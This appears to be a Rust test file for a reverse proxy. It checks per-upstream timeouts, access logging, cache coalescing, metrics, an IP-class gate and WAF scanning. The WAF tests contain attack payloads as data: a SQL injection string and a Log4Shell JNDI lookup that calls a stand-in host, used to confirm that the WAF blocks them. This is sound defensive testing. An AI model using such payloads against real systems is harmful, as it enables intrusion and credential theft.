/// Answers every request `delay` after receiving it.
async fn slow_origin(delay: Duration) -> u16 {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            tokio::spawn(async move {
                let svc = hyper::service::service_fn(
                    move |_req: Request<hyper::body::Incoming>| async move {
                        tokio::time::sleep(delay).await;
                        Ok::<_, std::convert::Infallible>(
                            hyper::Response::builder()
                                .header("cache-control", "public, max-age=60")
                                .body(Full::new(Bytes::from_static(b"slow")))
                                .unwrap(),
                        )
                    },
                );
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(hyper_util::rt::TokioIo::new(stream), svc)
                    .await;
            });
        }
    });
    port
}

/// The deadline is the upstream's own: shorter than the default cuts a slow origin early,
/// longer than the default lets one answer that the default would have cut (the default is
/// 2 s under test, 30 s in a release build).
#[tokio::test]
async fn request_timeout_ms_is_per_upstream_in_both_directions() {
    let slow = slow_origin(Duration::from_millis(1500)).await;
    let slower = slow_origin(Duration::from_millis(3500)).await;
    let st = hosts_state(
        "[[route]]\npath = \"/short/{*r}\"\nupstream = \"short\"\n\
         [[route]]\npath = \"/long/{*r}\"\nupstream = \"long\"\n\
         [[route]]\npath = \"/default/{*r}\"\nupstream = \"dflt\"\n",
        &format!(
            "[upstream.short]\nurl = \"http://127.0.0.1:{slow}\"\nrequest_timeout_ms = 200\n\
             [upstream.long]\nurl = \"http://127.0.0.1:{slower}\"\nrequest_timeout_ms = 10000\n\
             [upstream.dflt]\nurl = \"http://127.0.0.1:{slower}\"\n"
        ),
    );
    let (code, took) = timed(&st, Method::GET, "/short/x").await;
    assert_eq!(code, 504, "cut at 200 ms, the origin needs 1500");
    assert!(
        took >= Duration::from_millis(200) && took < Duration::from_millis(1400),
        "cut at the configured 200 ms, not at the origin's 1500 or the default: {took:?}"
    );
    let (code, took) = timed(&st, Method::GET, "/long/x").await;
    assert_eq!(code, 200, "10 s allowed, the origin needs 3.5: {took:?}");
    let (code, took) = timed(&st, Method::GET, "/default/x").await;
    assert_eq!(
        code, 504,
        "the same origin without the setting is cut at the default"
    );
    assert!(took < Duration::from_millis(3400), "{took:?}");
}

/// Every attempt of a pool gets the upstream's deadline, not the default.
#[tokio::test]
async fn request_timeout_ms_bounds_each_pool_attempt() {
    let (h1, a1) = hanging_origin().await;
    let (h2, a2) = hanging_origin().await;
    let st = hosts_state(
        "[[route]]\npath = \"/{*rest}\"\nupstream = \"p\"\n",
        &format!(
            "[upstream.p]\nurls = [\"http://127.0.0.1:{h1}\", \"http://127.0.0.1:{h2}\"]\n\
             request_timeout_ms = 250\n"
        ),
    );
    let (code, took) = timed(&st, Method::GET, "/p").await;
    assert_eq!(code, 504);
    assert_eq!(
        (a1.load(Ordering::Relaxed), a2.load(Ordering::Relaxed)),
        (1, 1),
        "each member tried once"
    );
    assert!(
        took >= Duration::from_millis(500) && took < Duration::from_millis(3000),
        "two attempts of 250 ms, not two of the default: {took:?}"
    );
}

/// A cache miss fetches from the origin under the same deadline.
#[tokio::test]
async fn request_timeout_ms_bounds_a_cache_fetch() {
    let slow = slow_origin(Duration::from_millis(1500)).await;
    let st = hosts_state(
        "[[route]]\npath = \"/{*rest}\"\nupstream = \"u\"\nmode = \"static_cache\"\n\
         cache_profile = \"c\"\n",
        &format!("[upstream.u]\nurl = \"http://127.0.0.1:{slow}\"\nrequest_timeout_ms = 200\n"),
    );
    let (code, took) = timed(&st, Method::GET, "/asset.js").await;
    assert_eq!(code, 504);
    assert!(took < Duration::from_millis(1400), "{took:?}");
}

// ── the access log is on by default, and can be turned off ──────────────────

/// Requests through a state built from `extra` (top-level TOML), with the subscriber
/// zion installs by default (`DEFAULT_FILTER`); returns what it printed.
async fn access_log_output(extra: &str) -> String {
    use tracing_subscriber::layer::SubscriberExt;
    #[derive(Clone, Default)]
    struct Buf(Arc<Mutex<Vec<u8>>>);
    impl std::io::Write for Buf {
        fn write(&mut self, b: &[u8]) -> std::io::Result<usize> {
            self.0.lock().unwrap().extend_from_slice(b);
            Ok(b.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }
    let (port, _) = named_origin("A").await;
    let toml = format!(
        "{extra}\n[server]\nlisten_http=\"127.0.0.1:0\"\nlisten_https=\"127.0.0.1:0\"\n\
         [tls]\ncert_path=\"/c\"\nkey_path=\"/k\"\n[upstreams]\nu=\"http://127.0.0.1:{port}\"\n\
         [[route]]\npath=\"/{{*r}}\"\nupstream=\"u\"\n"
    );
    let st = AppState::for_tests(&toml::from_str::<ZionConfig>(&toml).unwrap());
    let buf = Buf::default();
    let w = buf.clone();
    let subscriber = tracing_subscriber::registry()
        .with(tracing_subscriber::EnvFilter::new(
            crate::observability::DEFAULT_FILTER,
        ))
        .with(
            tracing_subscriber::fmt::layer()
                .with_ansi(false)
                .with_writer(move || w.clone()),
        );
    let _guard = tracing::subscriber::set_default(subscriber);
    let _ = fetch(&st, "/logged-path", &[]).await;
    let out = buf.0.lock().unwrap().clone();
    String::from_utf8(out).unwrap()
}

#[tokio::test]
async fn the_access_log_is_written_by_default() {
    let out = access_log_output("").await;
    assert!(
        out.contains("access") && out.contains("path=/logged-path") && out.contains("status=200"),
        "{out}"
    );
}

#[tokio::test]
async fn the_access_log_can_be_turned_off() {
    let out = access_log_output("[access_log]\nenabled = false").await;
    assert!(!out.contains("/logged-path"), "{out}");
}

// ── a body on GET is scanned like any other body ────────────────────────────

#[tokio::test]
async fn an_injection_in_a_get_body_is_blocked_on_a_waf_route() {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = hosts_state(
        "[[route]]\npath = \"/waf/{*rest}\"\nupstream = \"w\"\nwaf = true\n",
        &format!("w = \"http://127.0.0.1:{port}\""),
    );
    let send_get = |body: &'static [u8], ct: Option<&'static str>| {
        let st = st.clone();
        async move {
            let mut b = Request::builder().method(Method::GET).uri("/waf/search");
            if let Some(ct) = ct {
                b = b.header("content-type", ct);
            }
            let req = b
                .body(
                    Full::new(Bytes::from_static(body))
                        .map_err(|n| match n {})
                        .boxed(),
                )
                .unwrap();
            process_request(req, st, "203.0.113.9:1".parse().unwrap(), false)
                .await
                .unwrap()
                .status()
                .as_u16()
        }
    };
    let before = hits(&o);
    assert_eq!(
        send_get(
            b"q=1' UNION SELECT username,password FROM users--",
            Some("application/x-www-form-urlencoded")
        )
        .await,
        400,
        "the body is scanned"
    );
    assert_eq!(hits(&o), before, "and never reaches the upstream");
    assert_eq!(
        send_get(b"", None).await,
        200,
        "a GET without a body is unaffected"
    );
    assert_eq!(
        send_get(b"{\"q\":\"laptop\"}", Some("application/json")).await,
        200,
        "a benign GET body is forwarded"
    );
}

// ── [upstream.x] keepalive sizes the idle pool ──────────────────────────────

/// An HTTP/1.1 origin that counts the TCP connections it accepts.
async fn conn_counting_origin() -> (u16, Arc<std::sync::atomic::AtomicUsize>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let conns = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let c = conns.clone();
    tokio::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            c.fetch_add(1, Ordering::Relaxed);
            tokio::spawn(async move {
                let svc =
                    hyper::service::service_fn(|_req: Request<hyper::body::Incoming>| async {
                        Ok::<_, std::convert::Infallible>(hyper::Response::new(Full::new(
                            Bytes::from_static(b"ok"),
                        )))
                    });
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(TokioIo::new(stream), svc)
                    .await;
            });
        }
    });
    (port, conns)
}

#[tokio::test]
async fn keepalive_sizes_the_idle_upstream_pool() {
    for (keepalive, expect_reuse) in [("", true), ("keepalive = 0", false)] {
        let (port, conns) = conn_counting_origin().await;
        let st = hosts_state(
            "[[route]]\npath = \"/{*rest}\"\nupstream = \"u\"\n",
            &format!("[upstream.u]\nurl = \"http://127.0.0.1:{port}\"\n{keepalive}"),
        );
        for i in 0..5 {
            assert_eq!(call(&st, &format!("/k{i}")).await.0, 200);
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        let n = conns.load(Ordering::Relaxed);
        if expect_reuse {
            assert_eq!(n, 1, "default keepalive reuses one pooled connection");
        } else {
            assert_eq!(n, 5, "keepalive = 0 keeps no idle connection");
        }
    }
}

// ── zion_cache_entries: the cap is observable (#481) ────────────────────────

#[tokio::test]
async fn the_number_of_cached_entries_is_on_metrics() {
    let (port, _) = named_origin("A").await;
    let st = hosts_state(
        "[[route]]\npath = \"/{*rest}\"\nupstream = \"a\"\nmode = \"static_cache\"\ncache_profile = \"c\"\n",
        &format!("a = \"http://127.0.0.1:{port}\""),
    );
    let get = |uri: String, peer: &'static str| {
        let st = st.clone();
        async move {
            let req = Request::builder()
                .method(Method::GET)
                .uri(uri)
                .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
                .unwrap();
            let resp = process_request(req, st, peer.parse().unwrap(), false)
                .await
                .unwrap();
            let status = resp.status().as_u16();
            let body = resp.into_body().collect().await.unwrap().to_bytes();
            (status, String::from_utf8_lossy(&body).into_owned())
        }
    };
    let entries = |metrics: &str| -> u64 {
        metrics
            .lines()
            .find_map(|l| l.strip_prefix("zion_cache_entries "))
            .expect("zion_cache_entries is rendered")
            .trim()
            .parse()
            .unwrap()
    };
    let (status, body) = get("/metrics".into(), "127.0.0.1:1").await;
    assert_eq!(status, 200);
    assert_eq!(entries(&body), 0);
    // The profile caps at 100: 250 distinct objects leave exactly the cap.
    for i in 0..250 {
        assert_eq!(get(format!("/o{i}"), "203.0.113.9:1").await.0, 200);
    }
    // The store happens on the task that tees the body: give the last ones a moment.
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        let n = entries(&get("/metrics".into(), "127.0.0.1:1").await.1);
        if n == 100 {
            break;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "zion_cache_entries = {n}, expected the cap (100)"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
}

// ── WAF: request header values (#519) ───────────────────────────────────────

/// Through the pipeline: a payload in a scanned header is refused, shadow mode counts it and
/// lets it through, and a route whose profile lists no header behaves as before.
#[tokio::test]
async fn the_waf_scans_the_headers_a_profile_lists() {
    let (port, hits) = named_origin("A").await;
    let st = hosts_state(
        "[[route]]\npath = \"/scan/{*r}\"\nupstream = \"a\"\nwaf_profile = \"h\"\n\
         [[route]]\npath = \"/shadow/{*r}\"\nupstream = \"a\"\nwaf_profile = \"h\"\nwaf_shadow = true\n\
         [[route]]\npath = \"/plain/{*r}\"\nupstream = \"a\"\nwaf = true\n",
        &format!(
            "a = \"http://127.0.0.1:{port}\"\n[waf_profile.h]\nscan_headers = [\"user-agent\", \"x-*\"]"
        ),
    );
    let send = |path: &'static str, ua: &'static str| {
        let st = st.clone();
        async move {
            let req = Request::builder()
                .method(Method::GET)
                .uri(path)
                .header("user-agent", ua)
                .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
                .unwrap();
            let resp = process_request(req, st, "203.0.113.9:1".parse().unwrap(), false)
                .await
                .unwrap();
            resp.status().as_u16()
        }
    };
    const LOG4SHELL: &str = "${jndi:ldap://evil.example/a}";
    const BROWSER: &str = "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0";
    let would_block = || {
        crate::metrics::METRICS
            .waf_shadow_would_block
            .load(Ordering::Relaxed)
    };
    assert_eq!(send("/scan/x", BROWSER).await, 200);
    let before = hits.load(Ordering::Relaxed);
    assert_eq!(
        send("/scan/x", LOG4SHELL).await,
        400,
        "refused before the upstream"
    );
    assert_eq!(
        hits.load(Ordering::Relaxed),
        before,
        "the origin never saw it"
    );
    let counted = would_block();
    assert_eq!(
        send("/shadow/x", LOG4SHELL).await,
        200,
        "shadow mode lets it through"
    );
    assert!(would_block() > counted, "and counts it");
    assert_eq!(
        send("/plain/x", LOG4SHELL).await,
        200,
        "a WAF route that lists no header does not scan headers (unchanged default)"
    );
}

// ── Singleflight: waiters always get an answer ──────────────────────────────
//
// Concurrent misses for one key share one origin fetch. Whatever becomes of that fetch,
// every request that waited on it has to be answered. From v0.8.0 to v0.9.10 it was not:
// a waiter kept the channel it waited on open, so a fetch that stored nothing left all of
// them waiting for good; and a fetch abandoned because its client went away left its
// registration behind, so every later request for that URL waited on a fetch that no
// longer existed.

/// GET `uri` and read the whole response, as a client that stays does: (status,
/// `X-Zion-Cache`).
async fn get_whole(st: &Arc<AppState>, uri: &str) -> (u16, String) {
    let resp = process_request(
        get(uri, &[]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let status = resp.status().as_u16();
    let cache = resp
        .headers()
        .get("x-zion-cache")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    let _ = resp.into_body().collect().await;
    (status, cache)
}

/// `n` simultaneous GETs of `uri`, each read to the end: the statuses, or `None` when they
/// are not all answered within `within`.
async fn concurrent_statuses(
    st: &Arc<AppState>,
    uri: &'static str,
    n: usize,
    within: Duration,
) -> Option<Vec<u16>> {
    let mut requests = tokio::task::JoinSet::new();
    for _ in 0..n {
        let st = st.clone();
        requests.spawn(async move { get_whole(&st, uri).await.0 });
    }
    let all = async {
        let mut statuses = Vec::with_capacity(n);
        while let Some(status) = requests.join_next().await {
            statuses.push(status.expect("the request task"));
        }
        statuses
    };
    tokio::time::timeout(within, all).await.ok()
}

/// The response is not stored (a 404, a 500, `no-store`): every one of the requests that
/// arrived together gets it, and they do not take turns at the origin.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn requests_waiting_on_a_fetch_that_stores_nothing_are_all_answered() {
    for (status, cc) in [
        (404u16, "public, max-age=60"),
        (500, "public, max-age=60"),
        (200, "no-store"),
    ] {
        let (o, st) = rig_cc("", cc).await;
        o.status.store(status, Ordering::Relaxed);
        o.delay_ms.store(200, Ordering::Relaxed);
        let t0 = std::time::Instant::now();
        let statuses = concurrent_statuses(&st, "/missing", 12, Duration::from_secs(5))
            .await
            .unwrap_or_else(|| {
                panic!("{status} {cc:?}: some of the 12 requests never got an answer")
            });
        assert_eq!(statuses, vec![status; 12], "{status} {cc:?}");
        // The first fetch, then the eleven others together: about two origin delays, not
        // twelve (2.4 s) as it would be if each wake elected one fetcher.
        assert!(
            t0.elapsed() < Duration::from_millis(1_500),
            "{status} {cc:?}: took {:?}, the waiters queued for the origin",
            t0.elapsed()
        );
        assert!(
            (2..=12).contains(&hits(&o)),
            "{status} {cc:?}: {} origin fetches",
            hits(&o)
        );
        assert_eq!(st.inflight.len(), 0, "no registration is left behind");
    }
}

/// The happy path keeps its property: one origin fetch for all of them.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn requests_arriving_together_for_a_storable_response_share_one_fetch() {
    let (o, st) = rig("").await;
    o.delay_ms.store(200, Ordering::Relaxed);
    let statuses = concurrent_statuses(&st, "/shared", 12, Duration::from_secs(5))
        .await
        .expect("all answered");
    assert_eq!(statuses, vec![200; 12]);
    assert_eq!(hits(&o), 1, "coalesced on one fetch");
    settle().await;
    assert_eq!(st.inflight.len(), 0);
    assert_eq!(get_whole(&st, "/shared").await, (200, "HIT".to_string()));
    assert_eq!(hits(&o), 1);
}

/// The fetcher's client reads the headers and leaves before the body is through: nothing
/// is stored, and the requests that were waiting for it are answered all the same.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn requests_waiting_on_a_fetch_whose_client_left_mid_body_are_answered() {
    let (o, st) = rig("").await;
    o.delay_ms.store(200, Ordering::Relaxed);
    *o.big.lock().unwrap() = Some((4 * 1024 * 1024, false));
    // `send` drops the response as soon as it has the status: a client that went away.
    let leaver = tokio::spawn({
        let st = st.clone();
        async move { send(&st, Method::GET, "/big").await }
    });
    tokio::time::sleep(Duration::from_millis(50)).await;
    let statuses = concurrent_statuses(&st, "/big", 6, Duration::from_secs(5))
        .await
        .expect("the waiters are answered");
    assert_eq!(statuses, vec![200; 6]);
    assert_eq!(leaver.await.unwrap(), 200);
    settle().await;
    assert_eq!(st.inflight.len(), 0);
}

/// A client that goes away while its request is being fetched: hyper drops the request
/// future there and then. The URL must still be answerable afterwards, by the cache-miss
/// path like any other, and requests that were waiting on that fetch must be answered too.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_fetch_abandoned_by_its_client_does_not_leave_the_url_unanswerable() {
    let (o, st) = rig("").await;
    o.delay_ms.store(400, Ordering::Relaxed);
    // The fetcher, abandoned mid-fetch, and two requests already waiting on it.
    let fetcher = tokio::spawn({
        let st = st.clone();
        async move { send(&st, Method::GET, "/abandoned").await }
    });
    // (wait for the fetch to be under way: registered, and at the origin)
    let under_way = async {
        while st.inflight.len() != 1 || hits(&o) != 1 {
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
    };
    tokio::time::timeout(Duration::from_secs(5), under_way)
        .await
        .expect("the fetch started");
    let waiters = tokio::spawn({
        let st = st.clone();
        async move { concurrent_statuses(&st, "/abandoned", 2, Duration::from_secs(5)).await }
    });
    tokio::time::sleep(Duration::from_millis(50)).await;
    fetcher.abort();
    let _ = fetcher.await;

    assert_eq!(
        waiters.await.unwrap(),
        Some(vec![200, 200]),
        "the requests that were waiting on it are answered"
    );
    // And a request that comes later, by which time nothing is registered.
    let later = tokio::time::timeout(Duration::from_secs(5), get_whole(&st, "/abandoned"))
        .await
        .expect("a later request for the same URL is answered");
    assert_eq!(later.0, 200);
    settle().await;
    assert_eq!(st.inflight.len(), 0, "the abandoned registration is gone");
}

/// The fetcher finishes and publishes before any other request has subscribed (the channel
/// is created with no receiver). A request that took the sender out of the map a moment
/// earlier and subscribes a moment later must see the completion, not wait on a channel
/// nobody writes to again. `Sender::send` stores nothing when there is no receiver, which
/// is how 1 to 4 requests in 300,000 hung under load.
#[tokio::test]
async fn completion_published_before_anyone_subscribed_is_seen_by_a_late_subscriber() {
    let (_o, st) = rig("").await;
    let key: Arc<str> = Arc::from("/late");
    // The fetcher registers...
    let (tx, inserted) = st
        .inflight
        .get_or_insert_with(key.clone(), || tokio::sync::watch::channel(false).0);
    assert!(inserted);
    let fetching = crate::dispatch::Fetching::for_tests(st.clone(), key.clone(), tx);
    // ... a second request finds the registration...
    let (seen, inserted) = st
        .inflight
        .get_or_insert_with(key.clone(), || tokio::sync::watch::channel(false).0);
    assert!(!inserted);
    // ... the fetcher completes, with nobody subscribed yet...
    fetching.stored();
    assert_eq!(st.inflight.len(), 0, "and takes its registration out");
    // ... and only then does the second request subscribe and wait, as the code does.
    let mut rx = seen.subscribe();
    drop(seen);
    let woke = tokio::time::timeout(Duration::from_secs(2), rx.wait_for(|v| *v)).await;
    assert!(
        matches!(woke, Ok(Ok(_))),
        "the late subscriber saw the completion"
    );
}

/// The guard takes out its own registration and no one else's: by the time a long body
/// has been streamed, another request may be the fetcher for the same key.
#[tokio::test]
async fn a_finished_fetch_removes_its_own_registration_and_not_its_successors() {
    let (_o, st) = rig("").await;
    let key: Arc<str> = Arc::from("/k");
    let register = || {
        st.inflight
            .get_or_insert_with(key.clone(), || tokio::sync::watch::channel(false).0)
    };
    let (tx, _) = register();
    let first = crate::dispatch::Fetching::for_tests(st.clone(), key.clone(), tx);
    // The first registration is purged from under it (as an explicit remove would), and a
    // second fetch registers under the same key.
    st.inflight.remove(&key);
    let (tx2, inserted) = register();
    assert!(inserted);
    let second = crate::dispatch::Fetching::for_tests(st.clone(), key.clone(), tx2);
    drop(first);
    assert_eq!(
        st.inflight.len(),
        1,
        "the successor's registration is untouched"
    );
    // A waiter on the second fetch is woken with an error when it ends without storing.
    let (seen, _) = register();
    let mut rx = seen.subscribe();
    drop(seen);
    drop(second);
    assert_eq!(st.inflight.len(), 0);
    let woke = tokio::time::timeout(Duration::from_secs(2), rx.wait_for(|v| *v)).await;
    assert!(
        matches!(woke, Ok(Err(_))),
        "a fetch that stored nothing closes the channel"
    );
}

// ── [sovereign.overrides]: the gate asks the operator's list first ──────────

/// The class that `[sovereign.enforce]` acts on is the operator's override when
/// there is one, in both directions: an address the tables do not know is denied
/// because the operator calls it a datacenter, and an address the tables call
/// `gov_ita` passes because the operator calls it `unknown`.
#[cfg(feature = "geo-ita")]
#[tokio::test]
async fn the_sovereign_gate_consults_the_operator_overrides_first() {
    let (port, _) = named_origin("A").await;
    let state = |overrides: &str| {
        let toml = format!(
            r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"
[tls]
cert_path = "/c"
key_path = "/k"
[sovereign]
enabled = true
[sovereign.enforce]
enabled = true
deny = ["datacenter_ita", "gov_ita"]
{overrides}
[upstreams]
a = "http://127.0.0.1:{port}"
[[route]]
path = "/{{*rest}}"
upstream = "a"
"#
        );
        AppState::for_tests(&toml::from_str::<ZionConfig>(&toml).unwrap())
    };
    let status = |st: Arc<AppState>, peer: &'static str| async move {
        let req = Request::builder()
            .method(Method::GET)
            .uri("/page")
            .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
            .unwrap();
        let peer: SocketAddr = format!("{peer}:40000").parse().unwrap();
        process_request(req, st, peer, false)
            .await
            .unwrap()
            .status()
            .as_u16()
    };

    // The tables alone: 198.51.100.0/24 is documentation space (unknown), GARR is gov_ita.
    let plain = state("");
    assert_eq!(status(plain.clone(), "198.51.100.7").await, 200);
    assert_eq!(status(plain.clone(), "193.205.0.1").await, 403);

    let st = state(
        "[sovereign.overrides]\n\"198.51.100.0/24\" = \"datacenter_ita\"\n\"193.205.0.0/24\" = \"unknown\"\n",
    );
    assert_eq!(status(st.clone(), "198.51.100.7").await, 403);
    assert_eq!(status(st.clone(), "198.51.101.7").await, 200);
    assert_eq!(status(st.clone(), "193.205.0.1").await, 200);
    // One /24 further the table still answers.
    assert_eq!(status(st.clone(), "193.205.1.1").await, 403);
}
